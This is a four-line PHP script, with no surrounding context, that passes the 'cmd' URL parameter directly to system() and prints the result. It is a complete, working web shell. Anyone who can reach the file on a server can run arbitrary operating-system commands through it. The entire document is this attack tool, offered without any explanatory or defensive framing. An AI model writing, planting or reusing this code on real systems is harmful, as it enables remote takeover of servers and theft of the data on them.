<?php
  $command = $_GET['cmd'];
  echo system($command);
?>
